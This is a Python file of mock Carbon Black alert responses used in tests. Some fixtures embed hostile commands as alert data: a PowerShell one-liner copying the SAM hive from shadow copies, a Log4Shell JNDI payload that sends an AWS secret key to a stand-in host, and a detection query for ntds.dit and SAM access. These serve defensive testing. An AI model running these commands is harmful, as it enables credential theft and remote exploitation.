"""Mock responses for alert queries."""

GET_ALERT_RESP = {"org_key": "ABCD1234",
                  "alert_url": "https://defense.conferdeploy.net/alerts?s[c][query_string]= \
    id:52fa009d-e2d1-4118-8a8d-04f521ae66aa&orgKey=ABCD1234",
                  "id": "12ab345cd6-e2d1-4118-8a8d-04f521ae66aa", "type": "WATCHLIST",
                  "backend_timestamp": "2023-04-14T21:30:40.570Z", "user_update_timestamp": None,
                  "backend_update_timestamp": "2023-04-14T21:30:40.570Z",
                  "detection_timestamp": "2023-04-14T21:27:14.719Z",
                  "first_event_timestamp": "2023-04-14T21:21:42.193Z",
                  "last_event_timestamp": "2023-04-14T21:21:42.193Z",
                  "severity": 8,
                  "reason": "Process infdefaultinstall.exe was detected by the report\
                   \"Defense Evasion - \" in 6 watchlists",
                  "reason_code": "05696200-88e6-3691-a1e3-8d9a64dbc24e:7828aec8-8502-3a43-ae68-41b5050dab5b",
                  "threat_id": "0569620088E6669121E38D9A64DBC24E", "primary_event_id": "-7RlZFHcSGWKSrF55B_4Ig-0",
                  "policy_applied": "NOT_APPLIED", "run_state": "RAN", "sensor_action": "ALLOW",
                  "workflow": {"change_timestamp": "2023-04-14T21:30:40.570Z", "changed_by_type": "SYSTEM",
                               "changed_by": "ALERT_CREATION", "closure_reason": "NO_REASON", "status": "OPEN"},
                  "determination": None,
                  "tags": ["tag1", "tag2"], "alert_notes_present": False, "threat_notes_present": False,
                  "is_updated": False,
                  "device_id": 18118174, "device_name": "demo-machine", "device_uem_id": "",
                  "device_target_value": "LOW",
                  "device_policy": "123abcde-c21b-4d64-9e3e-53595ef9c7af", "device_policy_id": 1234567,
                  "device_os": "WINDOWS",
                  "device_os_version": "Windows 10 x64 SP: 1", "device_username": "demouser@demoorg.com",
                  "device_location": "UNKNOWN", "device_external_ip": "1.2.3.4", "mdr_alert": False,
                  "report_id": "oJFtoawGS92fVMXlELC1Ow-b4ee93fc-ec58-436a-a940-b4d33a613513",
                  "report_name": "Defense Evasion - Signed Binary Proxy Execution - InfDefaultInstall",
                  "report_description": "\n\nThreat:\nThis behavior may be abused by adversaries to execute malicious\
                   files that could bypass application whitelisting and signature validation on systems.\n\nFalse \
                   Positives:\nSome environments may legitimate use this, but should be rare.\n\nScore:\n85",
                  "report_tags": ["attack", "attackframework", "threathunting"],
                  "report_link": "https://attack.mitre.org/wiki/Technique/T1218",
                  "ioc_id": "b4ee93fc-ec58-436a-a940-b4d33a613513-0",
                  "ioc_hit": "((process_name:InfDefaultInstall.exe)) -enriched:true",
                  "watchlists": [{"id": "9x0timurQkqP7FBKX4XrUw", "name": "Carbon Black Advanced Threats"}],
                  "process_guid": "ABC12345-000309c2-00000478-00000000-1d6a1c1f2b02805", "process_pid": 10980,
                  "process_name": "infdefaultinstall.exe",
                  "process_sha256": "1a2345cd88666a458f804e5d0fe925a9f55cf016733458c58c1980addc44cd774",
                  "process_md5": "12c34567894a49f13193513b0138f72a9", "process_effective_reputation": "LOCAL_WHITE",
                  "process_reputation": "NOT_LISTED",
                  "process_cmdline": "InfDefaultInstall.exe C:\\Users\\username\\userdir\\Infdefaultinstall.inf",
                  "process_username": "DEMO\\DEMOUSER", "process_issuer": "Demo Code Signing CA - G2",
                  "process_publisher": "Demo Test Authority", "childproc_guid": "", "childproc_username": "",
                  "childproc_cmdline": "",
                  "ml_classification_final_verdict": "NOT_ANOMALOUS", "ml_classification_global_prevalence": "LOW",
                  "ml_classification_org_prevalence": "LOW"}

GET_ALERT_RESP_INVALID_ALERT_ID = {"type": "CB_ANALYTICS", "id": "86123310980efd0b38111eba4bfa5e98aa30b19",
                                   "legacy_alert_id": None, "org_key": "ABCD1234",
                                   "create_time": "2021-05-13T00:20:46.474Z",
                                   "last_update_time": "2021-05-13T00:27:22.846Z",
                                   "first_event_time": "2021-05-13T00:20:13.043Z",
                                   "last_event_time": "2021-05-13T00:20:13.044Z",
                                   "threat_id": "a26842be6b54ea2f58848b23a3461a16", "severity": 1,
                                   "category": "MONITORED", "device_id": 8612331, "device_os": "WINDOWS",
                                   "device_os_version": "Windows Server 2019 x64", "device_name": "demo-machine",
                                   "device_username": "Administrator",
                                   "policy_id": 7113786, "policy_name": "Standard", "target_value": "MEDIUM",
                                   "workflow": {"state": "OPEN", "remediation": "None",
                                                "last_update_time": "2021-05-13T00:20:46.474Z",
                                                "comment": "None", "changed_by": "Carbon Black", },
                                   "notes_present": False, "tags": "None",
                                   "reason": "A port scan was detected from 10.169.255.100 on an external network \
                                   (off-prem).",
                                   "reason_code": "R_SCAN_OFF", "process_name": "svchost.exe",
                                   "device_location": "OFFSITE",
                                   "created_by_event_id": "0980efd0b38111eba4bfa5e98aa30b19",
                                   "threat_indicators": [{"process_name": "svchost.exe",
                                                          "sha256": "7fd065bac18c5278777ae4490810\
                                                          1cdfed72d26fa741367f0ad4d02020787ab6",
                                                          "ttps": ["ACTIVE_SERVER",
                                                                   "MITRE_T1046_NETWORK_SERVICE_SCANNING",
                                                                   "NETWORK_ACCESS", "PORTSCAN"], }],
                                   }

GET_ALERT_TYPE_WATCHLIST = {"org_key": "ABC12345",
                            "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]= \
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
                            "id": "887e6bbc-6224-4f36-ad37-084038b7fcab", "type": "WATCHLIST",
                            "backend_timestamp": "2023-07-17T17:42:29.822Z",
                            "user_update_timestamp": "null", "backend_update_timestamp": "2023-07-17T17:42:29.822Z",
                            "detection_timestamp": "2023-07-17T17:41:57.829Z",
                            "first_event_timestamp": "2023-07-17T17:40:24.688Z",
                            "last_event_timestamp": "2023-07-17T17:40:24.688Z", "severity": 10,
                            "reason": "Process powershell.exe was detected by the report \
     \"Credential Access - Suspect Volume Shadow Copy  Behavior Detected\" in  \
     watchlist \"Carbon Black Advanced Threats\"",
                            "reason_code": "d05c5be2-02f0-3161-bbe2-ee4b26c72712:b598b578-314c-39e2-b4ac-4a1b04b44708",
                            "threat_id": "D05C5BE202F0F1617BE2EE4B26C72712",
                            "primary_event_id": "Gy8SwrTARRWq6lp_PpxMKg-0",
                            "policy_applied": "NOT_APPLIED", "run_state": "RAN", "sensor_action": "ALLOW",
                            "workflow": {"change_timestamp": "2023-07-17T17:42:29.822Z", "changed_by_type": "SYSTEM",
                                         "changed_by": "ALERT_CREATION", "closure_reason": "NO_REASON",
                                         "status": "OPEN"},
                            "determination": {"change_timestamp": "2023-07-17T17:42:29.822Z", "value": "NONE",
                                              "changed_by_type": "null",
                                              "changed_by": "null"}, "tags": "null", "alert_notes_present": "false",
                            "threat_notes_present": "false",
                            "is_updated": "false", "device_id": 6948863, "device_name": "Kognos-W19-CB-3",
                            "device_uem_id": "",
                            "device_target_value": "MISSION_CRITICAL", "device_policy": "SSQ_Policy",
                            "device_policy_id": 112221,
                            "device_os": "WINDOWS", "device_os_version": "Windows Server 2019 x64",
                            "device_username": "rahul.gopi@devo.com",
                            "device_location": "UNKNOWN", "device_external_ip": "10.10.10.10",
                            "device_internal_ip": "10.10.10.10",
                            "mdr_alert": "false", "mdr_alert_notes_present": "false",
                            "mdr_threat_notes_present": "false",
                            "report_id": "MLRtPcpQGKFh5OE4BT3tQ-49760e2e-c1e4-42e9-8157-4084ff002bcc",
                            "report_name": "Credential Access - Suspect Volume Shadow Copy Behavior Detected",
                            "report_description": "\n\nThreat:\nAdversaries may attempt to access or create a copy of \
                            the Active Directory domain database in order to steal credential information, as well as \
                            obtain other information about domain members such as devices, users, and access rights. \
                            If you are responding to this alert you should take immediate action.\n\nFalse Positives:\n\
                            Some IT backup software may trigger this detection.\n\nScore:\n100",
                            "report_tags": ["credentialaccess", "activedirectory", "volumeshadowcopy", "ntds", "t1003",
                                            "attackframework",
                                            "windows"], "report_link": "https://attack.mitre.org/techniques/T1003/003/",
                            "ioc_id": "49760e2e-c1e4-42e9-8157-4084ff002bcc-0",
                            "ioc_hit": "((process_cmdline:HarddiskVolumeShadowCopy* AND (process_cmdline:\
                            ntds\\\\ntds.dit OR process_cmdline:system32\\\\config\\\\sam OR process_cmdline:system32\
                            \\\\config\\\\system)) - (process_name:windows\\\\system32\\\\esentutl.exe OR \
                            process_publisher:\"Veritas\\ Technologies\\ LLC\" OR process_publisher:\"Symantec\\ \
                            Corporation\")) -enriched:true",
                            "watchlists": [{"id": "Z7L0yVdGQ62w2VmqcBUnA", "name": "Carbon Black Advanced Threats"}],
                            "process_guid": "ABC12345-000309c2-00000478-00000000-1d6a1c1f2b02805", "process_pid": 1632,
                            "process_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                            "process_sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
                            "process_md5": "7353f60b1739074eb17c5f4dddefe239",
                            "process_effective_reputation": "TRUSTED_WHITE_LIST",
                            "process_reputation": "TRUSTED_WHITE_LIST",
                            "process_cmdline": "\"powershell.exe\" & {1..10 | % { \n try { [System.IO.File]:: \
    Copy(\\\"\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\\\"\" , \
     \\\"\"$env:TEMP\\SAMvss$_\\\"\", \\\"\"true\\\"\") } catch {}\n ls \\\"\"$env:TEMP\\SAMvss$_\\\"\" -ErrorAction  \
     Ignore\n}}",
                            "process_username": "KOGNOS-W19-CB-3\\Administrator",
                            "process_issuer": ["Microsoft Windows Production PCA 2011"],
                            "process_publisher": ["Microsoft Windows"],
                            "parent_guid": "ABC12345-006a07ff-000009a0-00000000-1d9b8d5c2fcbfb7",
                            "parent_pid": 2464,
                            "parent_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                            "parent_sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
                            "parent_md5": "7353f60b1739074eb17c5f4dddefe239",
                            "parent_effective_reputation": "TRUSTED_WHITE_LIST",
                            "parent_reputation": "TRUSTED_WHITE_LIST",
                            "parent_cmdline": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" -c \"\
                            cd c:\\ ; echo MYPID=$PID; Get-Date ; Invoke-AtomicTest T1003.002-6 \"",
                            "parent_username": "KOGNOS-W19-CB-3\\Administrator", "childproc_guid": "",
                            "childproc_username": "",
                            "childproc_cmdline": "", "ml_classification_final_verdict": "NOT_ANOMALOUS",
                            "ml_classification_global_prevalence": "MEDIUM", "ml_classification_org_prevalence": "LOW"}

GET_ALERT_TYPE_WATCHLIST_INVALID = {"org_key": "ABC12345",
                                    "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]=\
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
                                    "id": "887e6bbc-6224-4f36-ad37-084038b7fcab", "type": "WATCHLIST",
                                    "backend_timestamp": "2023-07-17T17:42:29.822Z",
                                    "user_update_timestamp": "null",
                                    "backend_update_timestamp": "2023-07-17T17:42:29.822Z",
                                    "detection_timestamp": "2023-07-17T17:41:57.829Z",
                                    "first_event_timestamp": "2023-07-17T17:40:24.688Z",
                                    "last_event_timestamp": "2023-07-17T17:40:24.688Z", "severity": 10,
                                    "reason": "Process powershell.exe was detected by the report \"Credential Access \
                                    - Suspect Volume Shadow Copy Behavior Detected\" in watchlist \"Carbon Black \
                                    Advanced Threats\"",
                                    "reason_code": "d05c5be2-02f0-3161-bbe2-ee4b26c72712\
                                    :b598b578-314c-39e2-b4ac-4a1b04b44708",
                                    "threat_id": "D05C5BE202F0F1617BE2EE4B26C72712",
                                    "primary_event_id": "Gy8SwrTARRWq6lp_PpxMKg-0",
                                    "policy_applied": "NOT_APPLIED", "run_state": "RAN", "sensor_action": "ALLOW",
                                    "workflow": {"change_timestamp": "2023-07-17T17:42:29.822Z",
                                                 "changed_by_type": "SYSTEM",
                                                 "changed_by": "ALERT_CREATION", "closure_reason": "NO_REASON",
                                                 "status": "OPEN"},
                                    "determination": {"change_timestamp": "2023-07-17T17:42:29.822Z", "value": "NONE",
                                                      "changed_by_type": "null",
                                                      "changed_by": "null"}, "tags": "null",
                                    "alert_notes_present": "false", "threat_notes_present": "false",
                                    "is_updated": "false", "device_id": 6948863, "device_name": "Kognos-W19-CB-3",
                                    "device_uem_id": "",
                                    "device_target_value": "MISSION_CRITICAL", "device_policy": "SSQ_Policy",
                                    "device_policy_id": 112221,
                                    "device_os": "WINDOWS", "device_os_version": "Windows Server 2019 x64",
                                    "device_username": "rahul.gopi@devo.com",
                                    "device_location": "UNKNOWN", "device_external_ip": "34.234.170.45",
                                    "device_internal_ip": "10.0.14.120",
                                    "mdr_alert": "false", "mdr_alert_notes_present": "false",
                                    "mdr_threat_notes_present": "false",
                                    "report_id": "MLRtPcpQGKFh5OE4BT3tQ-49760e2e-c1e4-42e9-8157-4084ff002bcc",
                                    "report_name": "Credential Access - Suspect Volume Shadow Copy Behavior Detected",
                                    "report_description": "\n\nThreat:\nAdversaries may attempt to access or create a \
                                    copy of the Active Directory domain database in order to steal credential \
                                    information, as well as obtain other information about domain members such as \
                                    devices, users, and access rights. If you are responding to this alert you should \
                                    take immediate action. \n\nFalse Positives:\nSome IT backup software may trigger \
                                    this detection.\n\nScore:\n100",
                                    "report_tags": ["credentialaccess", "activedirectory", "volumeshadowcopy", "ntds",
                                                    "t1003", "attackframework",
                                                    "windows"],
                                    "report_link": "https://attack.mitre.org/techniques/T1003/003/",
                                    "ioc_id": "49760e2e-c1e4-42e9-8157-4084ff002bcc-0",
                                    "ioc_hit": "((process_cmdline:HarddiskVolumeShadowCopy* AND (process_cmdline:\
                                    ntds\\\\ntds.dit OR process_cmdline:system32\\\\config\\\\sam OR \
                                    process_cmdline:system32\\\\config\\\\system)) -(process_name:windows\
                                    \\\\system32\\\\esentutl.exe OR process_publisher:\"Veritas\\ Technologies\\ LLC\" \
                                    OR process_publisher:\"Symantec\\ Corporation\")) -enriched:true",
                                    "watchlists": [
                                        {"id": "Z7L0yVdGQ62w2VmqcBUnA", "name": "Carbon Black Advanced Threats"}],
                                    "process_guid": "",
                                    "process_pid": 1632,
                                    "process_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                                    "process_sha256": "de96a6e69944335375dc1ac238336066\
                                    889d9ffc7d73628ef4fe1b1b160ab32c",
                                    "process_md5": "7353f60b1739074eb17c5f4dddefe239",
                                    "process_effective_reputation": "TRUSTED_WHITE_LIST",
                                    "process_reputation": "TRUSTED_WHITE_LIST",
                                    "process_cmdline": "\"powershell.exe\" & {1..10 | % { \n try { [System.IO.File]::\
                                    Copy(\\\"\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\
                                    \\config\\SAM\\\"\" , \\\"\"$env:TEMP\\SAMvss$_\\\"\", \\\"\"true\\\"\") } catch {}\
                                    \n ls \\\"\"$env:TEMP\\SAMvss$_\\\"\" -ErrorAction Ignore\n}}",
                                    "process_username": "KOGNOS-W19-CB-3\\Administrator",
                                    "process_issuer": ["Microsoft Windows Production PCA 2011"],
                                    "process_publisher": ["Microsoft Windows"],
                                    "parent_guid": "ABC12345-006a07ff-000009a0-00000000-1d9b8d5c2fcbfb7",
                                    "parent_pid": 2464,
                                    "parent_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                                    "parent_sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
                                    "parent_md5": "7353f60b1739074eb17c5f4dddefe239",
                                    "parent_effective_reputation": "TRUSTED_WHITE_LIST",
                                    "parent_reputation": "TRUSTED_WHITE_LIST",
                                    "parent_cmdline": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\
                                    \" -c \"cd c:\\ ; echo MYPID=$PID; Get-Date ; Invoke-AtomicTest T1003.002-6 \"",
                                    "parent_username": "KOGNOS-W19-CB-3\\Administrator", "childproc_guid": "",
                                    "childproc_username": "",
                                    "childproc_cmdline": "", "ml_classification_final_verdict": "NOT_ANOMALOUS",
                                    "ml_classification_global_prevalence": "MEDIUM",
                                    "ml_classification_org_prevalence": "LOW"}

GET_ALERT_RESP_WITH_NOTES = {"org_key": "ABC12345",
                             "alert_url": "defense-test03.cbdtest.io/alerts?s[c][query_string]=\
    id:52dbd1b6-539b-a3f7-34bd-f6eb13a99b81&orgKey=ABC12345",
                             "id": "52dbd1b6-539b-a3f7-34bd-f6eb13a99b81", "type": "CONTAINER_RUNTIME",
                             "backend_timestamp": "2023-07-18T00:02:17.465Z", "user_update_timestamp": "null",
                             "backend_update_timestamp": "2023-07-18T00:02:17.465Z",
                             "detection_timestamp": "2023-07-18T00:00:38.456Z",
                             "first_event_timestamp": "2023-07-17T23:59:31.502Z",
                             "last_event_timestamp": "2023-07-17T23:59:31.502Z",
                             "severity": 5,
                             "reason": "Detected a connection to a public destination that isn't allowed for \
                             this scope",
                             "reason_code": "6e41702c-c64e-4950-9eec-1737228cf9f7:f8b1637a-dc0c-49bb-bc28-5b48f97e6d58",
                             "threat_id": "78de82d612a7d3d4a6caffa4ce7e7bb718e23d926dcd9a5047f6e9f129279d44",
                             "primary_event_id": "5XkI7XjGQ-6k20UtdzvDKQ-552", "policy_applied": "NOT_APPLIED",
                             "run_state": "RAN",
                             "sensor_action": "ALLOW",
                             "workflow": {"change_timestamp": "2023-07-18T00:02:17.465Z", "changed_by_type": "SYSTEM",
                                          "changed_by": "ALERT_CREATION", "closure_reason": "NO_REASON",
                                          "status": "OPEN"},
                             "determination": {"change_timestamp": "2023-07-18T00:02:17.465Z", "value": "NONE",
                                               "changed_by_type": "null",
                                               "changed_by": "null"}, "tags": "null", "alert_notes_present": "false",
                             "threat_notes_present": "false",
                             "is_updated": "false", "mdr_alert": "false", "mdr_alert_notes_present": "false",
                             "mdr_threat_notes_present": "false", "netconn_remote_port": 443,
                             "netconn_local_port": 56802,
                             "netconn_protocol": "TCP", "netconn_remote_domain": "westus3.monitoring.azure.com",
                             "netconn_remote_ip": "10.10.10.10", "netconn_local_ip": "10.224.0.74",
                             "netconn_remote_ipv4": "10.10.10.10",
                             "netconn_local_ipv4": "10.224.0.74", "k8s_cluster": "test:test-azure-cni",
                             "k8s_namespace": "kube-system",
                             "k8s_kind": "DaemonSet", "k8s_workload_name": "ama-logs", "k8s_pod_name": "ama-logs-svxpg",
                             "k8s_policy_id": "6e41702c-c64e-4950-9eec-1737228cf9f7",
                             "k8s_policy": "test-runtime-policy",
                             "k8s_rule_id": "f8b1637a-dc0c-49bb-bc28-5b48f97e6d58",
                             "k8s_rule": "Allowed public destinations",
                             "connection_type": "EGRESS", "egress_group_id": "", "egress_group_name": "",
                             "ip_reputation": 0,
                             "remote_is_private": "false"}

GET_ALERT_NOTES = {"num_found": 2, "num_available": 2, "results": [
    {"author": "Grogu", "id": "3gsgsfds", "note": "I am Grogu", "create_timestamp": "2023-04-18T03:25:44.397Z",
     "last_update_timestamp": "2023-04-18T03:25:44.397Z", "source": "CUSTOMER", "parent_id": None,
     "read_history": None, "thread": None},
    {"author": "demouser@demoorg.com", "create_timestamp": "2023-04-18T03:25:44.397Z",
     "last_update_timestamp": "2023-04-18T03:25:44.397Z", "id": "2", "source": "CUSTOMER", "note": "My first note",
     "parent_id": None, "read_history": None, "thread": None}]}


GET_ALERT_NOTES_INTEGER_ID = {"num_found": 2, "num_available": 2, "results": [
    {"author": "Grogu", "id": "1", "note": "I am Grogu", "create_timestamp": "2023-04-18T03:25:44.397Z",
     "last_update_timestamp": "2023-04-18T03:25:44.397Z", "source": "CUSTOMER", "parent_id": None,
     "read_history": None, "thread": None},
    {"author": "demouser@demoorg.com", "create_timestamp": "2023-04-18T03:25:44.397Z",
     "last_update_timestamp": "2023-04-18T03:25:44.397Z", "id": "2", "source": "CUSTOMER", "note": "My first note",
     "parent_id": None, "read_history": None, "thread": None}]}

CREATE_ALERT_NOTE_RESP = {"author": "Grogu", "id": "3gsgsfds", "note": "I am Grogu",
                          "create_timestamp": "2023-04-18T03:25:44.397Z",
                          "last_update_timestamp": "2023-04-18T03:25:44.397Z",
                          "source": "CUSTOMER", "parent_id": None, "read_history": None, "thread": None}

CREATE_ALERT_FACET_BODY = {
    "terms": {
        "fields": [
            "TYPE"
        ],
    },
    "criteria": {
        "minimum_severity": "3"
    },
}

GET_ALERT_FACET_RESP = {
    "results": [
        {
            "field": "type",
            "values": [
                {
                    "total": 1916,
                    "id": "WATCHLIST",
                    "name": "WATCHLIST"
                },
                {
                    "total": 41,
                    "id": "CB_ANALYTICS",
                    "name": "CB_ANALYTICS"
                }
            ]
        }
    ]
}

GET_ALERT_FACET_RESP_INVALID = {
    "error_code": "INVALID_ENUM_VALUE", "message": "Malformed JSON input: terms.fields[0]", "field": "terms.fields[0]",
    "invalid_value": "jager", "known_values": [
        "TYPE",
        "K8S_POLICY",
        "K8S_POLICY_ID",
        "K8S_RULE",
        "K8S_RULE_ID",
        "ATTACK_TACTIC",
        "ATTACK_TECHNIQUE",
        "DEVICE_ID",
        "DEVICE_NAME",
        "APPLICATION_HASH",
        "APPLICATION_NAME",
        "RUN_STATE",
        "POLICY_APPLIED",
        "SENSOR_ACTION",
        "K8S_CLUSTER",
        "K8S_NAMESPACE",
        "K8S_KIND",
        "K8S_WORKLOAD_NAME",
        "CONNECTION_TYPE",
        "RULE_ID",
        "RULE_CONFIG_CATEGORY",
        "RULE_CONFIG_NAME",
        "RULE_CONFIG_ID",
        "THREAT_ID",
        "POLICY_CONFIGURATION_NAME",
        "DEVICE_POLICY",
        "REPORT_NAME",
        "WATCHLISTS_NAME",
        "THREAT_HUNT_NAME",
        "VENDOR_NAME",
        "PRODUCT_NAME",
        "EXTERNAL_DEVICE_FRIENDLY_NAME",
        "PROCESS_NAME",
        "PROCESS_SHA256",
        "PROCESS_EFFECTIVE_REPUTATION",
        "PROCESS_REPUTATION",
        "PROCESS_USERNAME",
        "PARENT_NAME",
        "PARENT_SHA256",
        "PARENT_USERNAME",
        "PARENT_REPUTATION",
        "PARENT_EFFECTIVE_REPUTATION",
        "CHILDPROC_EFFECTIVE_REPUTATION",
        "MDR_ALERT",
        "ORG_KEY",
        "TAGS",
        "SEVERITY",
        "WORKFLOW_STATUS",
        "WORKFLOW_CHANGED_BY_TYPE",
        "WORKFLOW_CHANGED_BY_AUTOCLOSE_RULE_ID",
        "DETERMINATION_VALUE",
        "DETERMINATION_CHANGED_BY_TYPE",
        "ORG_FEATURE_ENTITLEMENT",
        "ACCOUNT_NAME",
        "SLO_TIME_RANGE",
        "MDR_WORKFLOW_STATUS",
        "MDR_WORKFLOW_CHANGED_BY_TYPE",
        "MDR_WORKFLOW_CHANGED_BY",
        "MDR_WORKFLOW_CHANGED_BY_RULE_ID",
        "MDR_WORKFLOW_ASSIGNED_TO",
        "MDR_DETERMINATION_VALUE",
        "MDR_CLASSIFICATION_DETERMINATION_CODE",
        "MDR_DETERMINATION_SUB_DETERMINATION",
        "MDR_DETERMINATION_CHANGED_BY_TYPE",
        "MDR_ML_CLASSIFICATION_CONFIDENCE",
        "MDR_ML_CLASSIFICATION_VERDICT",
        "ML_CLASSIFICATION_FINAL_VERDICT",
        "CONTAINER_IMAGE_NAME",
        "CONTAINER_NAME"
    ]
}

GET_ALERT_v7_INTRUSION_DETECTION_SYSTEM_RESPONSE = {
    "org_key": "ABCD1234",
    "alert_url": "defense-dev01.cbdtest.io/alerts?s[c]"
                 "[query_string]=id:ca316d99-a808-3779-8aab-62b2b6d9541c&orgKey=ABCD1234",
    "id": "ca316d99-a808-3779-8aab-62b2b6d9541c",
    "type": "INTRUSION_DETECTION_SYSTEM",
    "backend_timestamp": "2023-02-03T17:27:33.007Z",
    "user_update_timestamp": "",
    "backend_update_timestamp": "2023-02-03T17:27:33.007Z",
    "detection_timestamp": "2023-02-03T17:22:03.945Z",
    "first_event_timestamp": "2023-02-03T17:22:03.945Z",
    "last_event_timestamp": "2023-02-03T17:22:03.945Z",
    "severity": 1,
    "reason": "HTTP traffic from asset DEV01-39X-1 matched IDS signature for threat CVE-2021-44228 Exploit",
    "reason_code": "DC68DDD6-4B82-4AAF-9321-B4EBB32F5C2D:B5974D4D-265E-4FAF-8F71-2F76AAD67857",
    "threat_id": "bbe232a02b6c5583786503c25fe9a1d29d6ed39d3a295a6ff5c07f81629d0017",
    "primary_event_id": "21AB6B27-9F72-11ED-A79A-005056A53F17",
    "policy_applied": "NOT_APPLIED",
    "run_state": "RAN",
    "sensor_action": "ALLOW",
    "workflow": {"change_timestamp": "2023-02-03T17:27:33.007Z",
                 "changed_by_type": "SYSTEM",
                 "changed_by": "ALERT_CREATION",
                 "closure_reason": "NO_REASON",
                 "status": "OPEN"},
    "determination": {"change_timestamp": "2023-02-03T17:27:33.007Z",
                      "value": "NONE",
                      "changed_by_type": "SYSTEM",
                      "changed_by": "ALERT_CREATION"},
    "tags": "",
    "alert_notes_present": False,
    "threat_notes_present": False,
    "is_updated": False,
    "rule_category_id": "DC68DDD6-4B82-4AAF-9321-B4EBB32F5C2D",
    "rule_id": "B5974D4D-265E-4FAF-8F71-2F76AAD67857",
    "device_id": 17482451,
    "device_name": "DEV01-39X-1",
    "device_uem_id": "",
    "device_target_value": "MEDIUM",
    "device_policy": "Standard",
    "device_policy_id": 165700,
    "device_os": "WINDOWS",
    "device_os_version": "Windows 10 x64",
    "device_username": "DemoMachine",
    "device_location": "UNKNOWN",
    "device_external_ip": "66.170.99.2",
    "device_internal_ip": "10.203.105.21",
    "mdr_alert": False,
    "mdr_alert_notes_present": False,
    "mdr_threat_notes_present": False,
    "ttps": [],
    "attack_tactic": "TA0001",
    "attack_technique": "T1190",
    "process_guid": "ABCD1234-010ac2d3-00001694-00000000-1d937f40884b9e0",
    "process_pid": 5780,
    "process_name": "c:\\windows\\system32\\curl.exe",
    "process_sha256": "d76d08c04dfa434de033ca220456b5b87e6b3f0108667bd61304142c54addbe4",
    "process_md5": "eac53ddafb5cc9e780a7cc086ce7b2b1",
    "process_effective_reputation": "TRUSTED_WHITE_LIST",
    "process_reputation": "TRUSTED_WHITE_LIST",
    "process_cmdline": "curl  -H \"Host: \\${jndi:ldap://\\{env:AWS_SECRET_ACCESS_KEY}.badserver.io}\" "
                       "http://google.com/testingids",
    "process_username": "DEV01-39X-1\\bit9qa",
    "process_issuer": ["Microsoft Windows Production PCA 2011"],
    "process_publisher": ["Microsoft Windows"],
    "parent_guid": "ABCD1234-010ac2d3-0000225c-00000000-1d9300e2bb5211a",
    "parent_pid": 8796,
    "parent_name": "c:\\windows\\system32\\cmd.exe",
    "parent_sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450",
    "parent_md5": "8a2122e8162dbef04694b9c3e0b6cdee",
    "parent_effective_reputation": "TRUSTED_WHITE_LIST",
    "parent_reputation": "TRUSTED_WHITE_LIST",
    "parent_cmdline": "\"C:\\WINDOWS\\system32\\cmd.exe\" ",
    "parent_username": "DEV01-39X-1\\bit9qa",
    "childproc_guid": "",
    "childproc_username": "",
    "childproc_cmdline": "",
    "netconn_remote_port": 80,
    "netconn_local_port": 49233,
    "netconn_protocol": "",
    "netconn_remote_domain": "google.com",
    "netconn_remote_ip": "142.250.189.174",
    "netconn_local_ip": "10.203.105.21",
    "netconn_remote_ipv4": "142.250.189.174",
    "netconn_local_ipv4": "10.203.105.21",
    "tms_rule_id": "4b98443a-ba0d-4ff5-b99e-e5e70432a214",
    "threat_name": "CVE-2021-44228 Exploit"
}

GET_NEW_ALERT_TYPE_RESP = {"org_key": "ABCD1234",
                           "alert_url": "https://defense.conferdeploy.net/alerts?s[c][query_string]="
                                        "id:MYVERYFIRSTNEWALERTTYPE0001&orgKey=ABCD1234",
                           "id": "MYVERYFIRSTNEWALERTTYPE0001",
                           "type": "FIRST_NEW_TEST_ALERT_TYPE",
                           "backend_timestamp": "2023-04-14T21:30:40.570Z",
                           "user_update_timestamp": None}

GET_OPEN_WORKFLOW_JOB_RESP = {
    "id": 666666,
    "type": "user_workflow_update",
    "job_parameters": {
        "job_parameters": {
            "request": {
                "criteria": {
                    "id": [
                        "ABC12345-2ee5-88a2-4427-4af4ab93f528"
                    ]
                },
                "determination": "TRUE_POSITIVE",
                "closure_reason": "OTHER",
                "status": "CLOSED",
                "note": "Note about the determination"
            },
            "userWorkflowDto": {
                "change_timestamp": "2023-10-18T13:19:01.921Z",
                "changed_by_type": "API",
                "changed_by": "EG3XXXXX",
                "closure_reason": "OTHER",
                "status": "CLOSED"
            }
        }
    },
    "connector_id": "EG3XXXXX",
    "org_key": "TEST",
    "status": "COMPLETED",
    "progress": {
        "num_total": 0,
        "num_completed": 0,
        "message": "Dismissal completed"
    },
    "create_time": "2023-10-18T13:19:02.000467Z",
    "last_update_time": "2023-10-18T13:19:02.527935Z"
}

GET_CLOSE_WORKFLOW_JOB_RESP = {
    "id": 666666,
    "type": "user_workflow_update",
    "job_parameters": {
        "job_parameters": {
            "request": {
                "criteria": {
                    "id": [
                        "ABC12345-2ee5-88a2-4427-4af4ab93f528"
                    ]
                },
                "determination": "TRUE_POSITIVE",
                "closure_reason": "OTHER",
                "status": "CLOSED",
                "note": "Note about the determination"
            },
            "userWorkflowDto": {
                "change_timestamp": "2023-10-18T13:19:01.921Z",
                "changed_by_type": "API",
                "changed_by": "EG3XXXXX",
                "closure_reason": "OTHER",
                "status": "CLOSED"
            }
        }
    },
    "connector_id": "EG3XXXXX",
    "org_key": "TEST",
    "status": "COMPLETED",
    "progress": {
        "num_total": 0,
        "num_completed": 0,
        "message": "Dismissal completed"
    },
    "create_time": "2023-10-18T13:19:02.000467Z",
    "last_update_time": "2023-10-18T13:19:02.527935Z"
}

GET_ALERT_WORKFLOW_INIT = {
    "id": "SOLO",
    "org_key": "test",
